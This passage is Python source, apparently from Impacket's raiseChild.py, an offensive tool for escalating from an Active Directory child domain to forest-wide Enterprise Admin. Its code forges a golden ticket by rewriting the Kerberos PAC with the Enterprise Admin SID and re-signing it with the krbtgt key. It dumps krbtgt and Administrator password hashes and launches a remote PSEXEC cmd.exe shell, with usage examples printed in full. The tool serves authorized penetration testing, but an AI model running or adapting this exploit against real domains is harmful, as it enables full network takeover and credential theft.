        self.__drsr = None
        creds = {}
        creds['lmhash'] = lmhash
        creds['nthash'] = nthash
        creds['aesKey'] = aesKey
        return rid, creds

    @staticmethod
    def makeGolden(tgt, originalCipher, sessionKey, ntHash, aesKey, extraSid):
        asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]

        # Let's extract Ticket's enc-data
        cipherText = asRep['ticket']['enc-part']['cipher']

        cipher = _enctype_table[asRep['ticket']['enc-part']['etype']]
        if cipher.enctype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(aesKey))
        elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
            key = Key(cipher.enctype, unhexlify(ntHash))
        else:
            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)

        # Key Usage 2
        # AS-REP Ticket and TGS-REP Ticket (includes TGS session
        # key or application session key), encrypted with the
        # service key (Section 5.3)
        plainText = cipher.decrypt(key, 2, cipherText)
        #hexdump(plainText)

        encTicketPart = decoder.decode(plainText, asn1Spec = EncTicketPart())[0]

        # Let's extend the ticket's validity a lil bit
        tenYearsFromNow = datetime.datetime.utcnow() + datetime.timedelta(days=365*10)
        encTicketPart['endtime'] = KerberosTime.to_asn1(tenYearsFromNow)
        encTicketPart['renew-till'] = KerberosTime.to_asn1(tenYearsFromNow)
        #print encTicketPart.prettyPrint()

        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec =AD_IF_RELEVANT())[0]
        #print adIfRelevant.prettyPrint()

        # So here we have the PAC
        pacType = PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
        buffers = pacType['Buffers']
        pacInfos = {}

        for nBuf in range(pacType['cBuffers']):
            infoBuffer = PAC_INFO_BUFFER(buffers)
            data = pacType['Buffers'][infoBuffer['Offset']-8:][:infoBuffer['cbBufferSize']]
            pacInfos[infoBuffer['ulType']] = data
            buffers = buffers[len(infoBuffer):]

        # Let's locate the KERB_VALIDATION_INFO and Checksums
        if PAC_LOGON_INFO in pacInfos:
            data = pacInfos[PAC_LOGON_INFO]
            validationInfo = VALIDATION_INFO()
            validationInfo.fromString(pacInfos[PAC_LOGON_INFO])
            lenVal = len(validationInfo.getData())
            validationInfo.fromStringReferents(data, lenVal)

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('VALIDATION_INFO before making it gold')
                validationInfo.dump()
                print ('\n')

            # Our Golden Well-known groups! :)
            groups = (513, 512, 520, 518, 519)
            validationInfo['Data']['GroupIds'] = list()
            validationInfo['Data']['GroupCount'] = len(groups)

            for group in groups:
                groupMembership = GROUP_MEMBERSHIP()
                groupId = NDRULONG()
                groupId['Data'] = group
                groupMembership['RelativeId'] = groupId
                groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
                validationInfo['Data']['GroupIds'].append(groupMembership)

            # Let's add the extraSid
            if validationInfo['Data']['SidCount'] == 0:
                # Let's be sure user's flag specify we have extra sids.
                validationInfo['Data']['UserFlags'] |= 0x20
                validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()

            validationInfo['Data']['SidCount'] += 1

            sidRecord = KERB_SID_AND_ATTRIBUTES()

            sid = RPC_SID()
            sid.fromCanonical(extraSid)

            sidRecord['Sid'] = sid
            sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED

            # And, let's append the magicSid
            validationInfo['Data']['ExtraSids'].append(sidRecord)

            validationInfoBlob = validationInfo.getData()+validationInfo.getDataReferents()
            validationInfoAlignment = b'\x00' * (((len(validationInfoBlob) + 7) // 8 * 8) - len(validationInfoBlob))

            if logging.getLogger().level == logging.DEBUG:
                logging.debug('VALIDATION_INFO after making it gold')
                validationInfo.dump()
                print ('\n')
        else:
            raise Exception('PAC_LOGON_INFO not found! Aborting')

        # Let's now clear the checksums
        if PAC_SERVER_CHECKSUM in pacInfos:
            serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])
            if serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
                serverChecksum['Signature'] = b'\x00'*12
            else:
                serverChecksum['Signature'] = b'\x00'*16
        else:
            raise Exception('PAC_SERVER_CHECKSUM not found! Aborting')

        if PAC_PRIVSVR_CHECKSUM in pacInfos:
            privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])
            privSvrChecksum['Signature'] = b'\x00'*12
            if privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
                privSvrChecksum['Signature'] = b'\x00'*12
            else:
                privSvrChecksum['Signature'] = b'\x00'*16
        else:
            raise Exception('PAC_PRIVSVR_CHECKSUM not found! Aborting')

        if PAC_CLIENT_INFO_TYPE in pacInfos:
            pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]
            pacClientInfoAlignment = b'\x00' * (((len(pacClientInfoBlob) + 7) // 8 * 8) - len(pacClientInfoBlob))
        else:
            raise Exception('PAC_CLIENT_INFO_TYPE not found! Aborting')


        # We changed everything we needed to make us special. Now let's repack and calculate checksums
        serverChecksumBlob = serverChecksum.getData()
        serverChecksumAlignment = b'\x00' * (((len(serverChecksumBlob) + 7) // 8 * 8) - len(serverChecksumBlob))

        privSvrChecksumBlob = privSvrChecksum.getData()
        privSvrChecksumAlignment = b'\x00' * (((len(privSvrChecksumBlob) + 7) // 8 * 8) - len(privSvrChecksumBlob))

        # The offset are set from the beginning of the PAC_TYPE
        # [MS-PAC] 2.4 PAC_INFO_BUFFER
        offsetData = 8 + len(PAC_INFO_BUFFER().getData())*4

        # Let's build the PAC_INFO_BUFFER for each one of the elements
        validationInfoIB = PAC_INFO_BUFFER()
        validationInfoIB['ulType'] = PAC_LOGON_INFO
        validationInfoIB['cbBufferSize'] =  len(validationInfoBlob)
        validationInfoIB['Offset'] = offsetData
        offsetData = (offsetData + validationInfoIB['cbBufferSize'] + 7) // 8 * 8

        pacClientInfoIB = PAC_INFO_BUFFER()
        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
        pacClientInfoIB['Offset'] = offsetData
        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] + 7) // 8 * 8

        serverChecksumIB = PAC_INFO_BUFFER()
        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
        serverChecksumIB['Offset'] = offsetData
        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] + 7) // 8 * 8

        privSvrChecksumIB = PAC_INFO_BUFFER()
        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
        privSvrChecksumIB['Offset'] = offsetData
        #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8

        # Building the PAC_TYPE as specified in [MS-PAC]
        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + \
            privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + \
            pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment
        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment

        pacType = PACTYPE()
        pacType['cBuffers'] = 4
        pacType['Version'] = 0
        pacType['Buffers'] = buffers + buffersTail

        blobToChecksum = pacType.getData()

        # If you want to do MD5, ucomment this
        checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]
        if serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
            keyServer = Key(Enctype.AES256, unhexlify(aesKey))
        elif serverChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
            keyServer = Key(Enctype.RC4, unhexlify(ntHash))
        else:
            raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'] )

        checkSumFunctionPriv= _checksum_table[privSvrChecksum['SignatureType']]
        if privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_sha1_96_aes256.value:
            keyPriv = Key(Enctype.AES256, unhexlify(aesKey))
        elif privSvrChecksum['SignatureType'] == constants.ChecksumTypes.hmac_md5.value:
            keyPriv = Key(Enctype.RC4, unhexlify(ntHash))
        else:
            raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'] )

        serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, 17, blobToChecksum)
        privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, 17, serverChecksum['Signature'])

        buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment
        pacType['Buffers'] = buffers + buffersTail

        authorizationData = AuthorizationData()
        authorizationData[0] = noValue
        authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
        authorizationData[0]['ad-data'] = pacType.getData()
        authorizationData = encoder.encode(authorizationData)

        encTicketPart['authorization-data'][0]['ad-data'] = authorizationData

        encodedEncTicketPart = encoder.encode(encTicketPart)

        cipher = _enctype_table[asRep['ticket']['enc-part']['etype']]
        if cipher.enctype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            key = Key(cipher.enctype, unhexlify(aesKey))
        elif cipher.enctype == constants.EncryptionTypes.rc4_hmac.value:
            key = Key(cipher.enctype, unhexlify(ntHash))
        else:
            raise Exception('Unsupported enctype 0x%x' % cipher.enctype)

        # Key Usage 2
        # AS-REP Ticket and TGS-REP Ticket (includes TGS session
        # key or application session key), encrypted with the
        # service key (Section 5.3)
        cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)

        asRep['ticket']['enc-part']['cipher'] = cipherText

        return encoder.encode(asRep), originalCipher, sessionKey

    def raiseUp(self, childName, childCreds, parentName):
        logging.info('Raising %s to %s' % (childName, parentName))

        # 3) Get the parents's Enterprise Admin SID (via [MS-LSAT])
        entepriseSid, targetName = self.getParentSidAndTargetName(parentName, childCreds, self.__targetRID)
        logging.info('%s Enterprise Admin SID is: %s-519' % (parentName,entepriseSid))

        # 4) Get the child domain's krbtgt credentials (via [MS-DRSR])
        targetUser = 'krbtgt'
        logging.info('Getting credentials for %s' % childName)
        rid, credentials = self.getCredentials(targetUser, childName, childCreds)
        print('%s/%s:%s:%s:%s:::' % (
        childName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (childName, targetUser, credentials['aesKey'].decode('utf-8')))

        # 5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
        userName = Principal(childCreds['username'], type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        TGT = {}
        TGS = {}
        while True:
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, childCreds['password'],
                                                                        childCreds['domain'], childCreds['lmhash'],
                                                                        childCreds['nthash'], None, self.__kdcHost)
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    # We might face this if the target does not support AES (most probably
                    # Windows XP). So, if that's the case we'll force using RC4 by converting
                    # the password to lm/nt hashes and hope for the best. If that's already
                    # done, byebye.
                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
                        from impacket.ntlm import compute_lmhash, compute_nthash
                        childCreds['lmhash'] = compute_lmhash(childCreds['password'])
                        childCreds['nthash'] = compute_nthash(childCreds['password'])
                        continue
                    else:
                        raise
                else:
                    raise

            # We have a TGT, let's make it golden
            goldenTicket, cipher, sessionKey = self.makeGolden(tgt, cipher, sessionKey, credentials['nthash'],
                                                               credentials['aesKey'], entepriseSid + '-519')
            TGT['KDC_REP'] = goldenTicket
            TGT['cipher'] = cipher
            TGT['oldSessionKey'] = oldSessionKey
            TGT['sessionKey'] = sessionKey

            # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
            if self.__target is None:
                serverName = Principal('cifs/%s' % self.getMachineName(gethostbyname(parentName)),
                                       type=constants.PrincipalNameType.NT_SRV_INST.value)
            else:
                serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
            try:
                logging.debug('Getting TGS for SPN %s' % serverName)
                tgsCIFS, cipherCIFS, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName,
                                                                                        childCreds['domain'], None,
                                                                                        goldenTicket, cipher,
                                                                                        sessionKey)
                TGS['KDC_REP'] = tgsCIFS
                TGS['cipher'] = cipherCIFS
                TGS['oldSessionKey'] = oldSessionKeyCIFS
                TGS['sessionKey'] = sessionKeyCIFS
                break
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    # We might face this if the target does not support AES (most probably
                    # Windows XP). So, if that's the case we'll force using RC4 by converting
                    # the password to lm/nt hashes and hope for the best. If that's already
                    # done, byebye.
                    if childCreds['lmhash'] == '' and childCreds['nthash'] == '':
                        from impacket.ntlm import compute_lmhash, compute_nthash
                        childCreds['lmhash'] = compute_lmhash(childCreds['password'])
                        childCreds['nthash'] = compute_nthash(childCreds['password'])
                    else:
                        raise
                else:
                    raise

        # 6) Use the generated ticket to log into the parent and get the krbtgt/admin info
        # 6) Use the generated ticket to log into the parent and get the target-user info
        logging.info('Getting credentials for %s' % parentName)
        targetUser = 'krbtgt'
        childCreds['TGT'] = TGT
        rid, credentials = self.getCredentials(targetUser, parentName, childCreds)
        print('%s/%s:%s:%s:%s:::' % (
        parentName, targetUser, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'].decode("utf-8")))

        ################ Get TargetUser credentials (Administrator credentials by default)
        logging.info('Target User account name is %s' % targetName)
        rid, credentials = self.getCredentials(targetName, parentName, childCreds)
        print('%s/%s:%s:%s:%s:::' % (parentName, targetName, rid, credentials['lmhash'].decode('utf-8'), credentials['nthash'].decode('utf-8')))
        print('%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetName, credentials['aesKey'].decode('utf-8')))

        targetCreds = {}
        targetCreds['username'] = targetName
        targetCreds['password'] = ''
        targetCreds['domain'] = parentName
        targetCreds['lmhash'] = credentials['lmhash']
        targetCreds['nthash'] = credentials['nthash']
        targetCreds['aesKey'] = credentials['aesKey']
        targetCreds['TGT'] =  None
        targetCreds['TGS'] =  None
        return targetCreds, TGT, TGS

    def exploit(self):
        # 1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
        childCreds = self.__creds
        childName, forestName = self.getChildInfo(self.__creds)
        logging.info('Raising child domain %s' % childName)

        # 2) Find out what the forest FQDN is (via [MS-NRPC])
        logging.info('Forest FQDN is: %s' % forestName)

        # Let's raise up our child!
        targetCreds, parentTGT, parentTGS = self.raiseUp(childName, childCreds, forestName)

        # 7) If file was specified, save the golden ticket in ccache format
        if self.__writeTGT is not None:
            logging.info('Saving golden ticket into %s' % self.__writeTGT)
            from impacket.krb5.ccache import CCache
            ccache = CCache()
            ccache.fromTGT(parentTGT['KDC_REP'], parentTGT['oldSessionKey'], parentTGT['sessionKey'])
            ccache.saveFile(self.__writeTGT)

        # 8) If target was specified, a PSEXEC shell is launched
        if self.__target is not None:
            logging.info('Opening PSEXEC shell at %s' % self.__target)
            from impacket.smbconnection import SMBConnection
            s = SMBConnection('*SMBSERVER', self.__target)
            s.kerberosLogin(targetCreds['username'], '', targetCreds['domain'], targetCreds['lmhash'],
                            targetCreds['nthash'], useCache=False)

            if self.__command != 'None':
                executer = PSEXEC(self.__command, targetCreds['username'], targetCreds['domain'], s, None, None)
                executer.run(self.__target)

if __name__ == '__main__':

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Privilege Escalation from a child domain up to its "
                                                                    "forest")

    parser.add_argument('target', action='store', help='domain/username[:password]')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format '
                                                                         'into the <pathname> file')
    #parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller (needed to get the user''s SID). If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-exec', action='store',metavar = "target address",  help='Target host you want to PSEXEC '
                        'against once the main attack finished')
    parser.add_argument('-targetRID', action='store', metavar = "RID", default='500', help='Target user RID you want to '
                        'dump credentials. Administrator (500) by default.')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

    if len(sys.argv)==1:
        parser.print_help()
        print("\nExamples: ")
        print("\tpython raiseChild.py childDomain.net/adminuser\n")
        print("\tthe password will be asked, or\n")
        print("\tpython raiseChild.py childDomain.net/adminuser:mypwd\n")
        print("\tor if you just have the hashes\n")
        print("\tpython raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser\n")

        print("\tThis will perform the attack and then psexec against target-exec as Enterprise Admin")
        print("\tpython raiseChild.py -target-exec targetHost childDomainn.net/adminuser\n")
        print("\tThis will perform the attack and then psexec against target-exec as User with RID 1101")
        print("\tpython raiseChild.py -target-exec targetHost -targetRID 1101 childDomainn.net/adminuser\n")
        print("\tThis will save the final goldenTicket generated in the ccache target file")
        print("\tpython raiseChild.py -w ccache childDomain.net/adminuser\n")
        sys.exit(1)
 
    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    domain, username, password = parse_credentials(options.target)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and options.hashes is None and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    commands = 'cmd.exe'

    try:
        pacifier = RAISECHILD(options.target_exec, username, password, domain, options, commands)
        pacifier.exploit()
    except SessionError as e:
        logging.critical(str(e))
        if e.getErrorCode() == STATUS_NO_LOGON_SERVERS:
            logging.info('Try using Kerberos authentication (-k switch). That might help solving the STATUS_NO_LOGON_SERVERS issue')
    except Exception as e:
        logging.debug('Exception:', exc_info=True)
        logging.critical(str(e))
        if hasattr(e, 'error_code'):
            if e.error_code == 0xc0000073:
                logging.info("Account not found in domain. (RID:%s)", options.targetRID)
